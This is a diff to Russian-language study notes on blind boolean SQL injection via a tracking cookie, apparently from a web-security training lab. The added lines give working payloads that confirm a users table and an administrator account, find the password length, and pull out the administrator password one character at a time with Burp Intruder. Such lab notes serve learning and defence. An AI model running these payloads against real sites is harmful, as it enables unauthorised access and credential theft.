@@ -155,10 +155,23 @@ Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND '1'='2<br>
 '1'='1 условие истинно. В результате отображается сообщение «Добро пожаловать обратно».<br>
 - Второе значение приводит к тому, что запрос не возвращает никаких результатов, поскольку внедренное условие<br> ложно. Сообщение «Добро пожаловать обратно» не отображается.
 
+Например, предположим, что есть таблица с именем Usersи столбцами Usernameи Password, и пользователь с именем Administrator.<br> Вы можете определить пароль для этого пользователя, отправляя серию входных данных для проверки пароля по одному символу за раз.
 
+Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'm
+**В результате возвращается сообщение "Добро пожаловать обратно", указывающее на то, что внедренное условие истинно, и, следовательно, первый символ пароля m**<br>
+**Это требует гораздо большего количества запросов, поэтому вам потребуется использовать Burp Intruder**<br>
+- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT SUBSTRING(password,&1&,1) FROM users WHERE username='administrator')='§a§ **(ВАРИАНТ 1)** <br>
+- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), &1&, 1) = '&m& **(ВАРИАНТ 2)** <br>
+  
+#### Также можно проверить наличие таблиц и пользователя
 
+- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT 'a' FROM users LIMIT 1)='a **(Убедитесь, что условие выполняется, и подтвердите наличие таблицы с именем users.)**
+- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT 'a' FROM users WHERE username='administrator')='a **(Убедитесь, что условие выполняется, и подтвердите, что существует пользователь с именем administrator**)
 
-
+### определение кол-во символов в пароле
+- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=&1&)='&a&<br>
+**Символ & вокруг цифр и букв помогает программе понять какое значение нужно менять при каждом последующем запросе** 
+**При использовании Burp Intruder потребуется список символов для быстрого перебора в & обычно это числа и буквы но также могут быть спец символы**
 
 
 
